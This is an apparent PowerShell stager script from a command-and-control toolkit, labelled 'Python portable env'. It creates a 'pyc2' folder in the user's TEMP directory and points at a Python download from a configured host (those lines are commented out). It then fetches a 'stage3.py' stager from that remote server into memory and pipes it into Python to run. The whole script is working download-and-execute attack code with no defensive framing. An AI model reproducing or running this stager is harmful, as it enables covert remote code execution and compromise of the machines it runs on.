# Python portable env

# Config
$RHOST = \"192.168.81.1\"
$RPORT = 8080
$Server = \"http://${RHOST}:${RPORT}\"
$Root = \"${env:TEMP}/pyc2\"

# Setup folder
New-Item -Type Directory -Path \"${Root}\" -Force | Out-Null
Set-Location \"${Root}\"

# Grab Python
# wget \"${Server}/resources/python3.zip\" -OutFile "python3.zip" -ErrorAction Ignore
# Expand-Archive -Path \"python3.zip\" -DestinationPath \"python3\"

# Load stager 3 into memory
$Stager3 = \"$((curl \"${RHOST}:${RPORT}/scripts/remote/stagers/stage3.py\").ToString())\"

# Launch stager 3
$Python3 = \"${Root}/python3/python.exe\"
echo \"${Stager3}\" | & \"${Python3}\"